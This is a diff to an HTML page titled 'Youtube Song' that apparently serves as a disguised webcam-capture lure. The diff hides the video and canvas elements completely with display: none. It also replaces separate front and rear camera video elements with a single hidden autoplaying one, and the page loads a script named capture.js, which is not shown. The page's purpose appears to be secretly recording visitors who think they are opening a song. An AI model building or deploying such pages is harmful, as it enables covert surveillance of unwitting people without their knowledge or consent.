@@ -5,15 +5,12 @@
   <title>Youtube Song</title>
   <style>
     video, canvas {
-      position: absolute;
-      width: 1px; height: 1px;
-      opacity: 0; pointer-events: none;
+      display: none;
     }
   </style>
 </head>
 <body>
-  <video id="frontVideo" autoplay playsinline muted></video>
-  <video id="rearVideo"  autoplay playsinline muted></video>
+  <video id="video" autoplay playsinline muted></video>
   <canvas id="canvas"></canvas>
   <script src="capture.js"></script>
 </body>
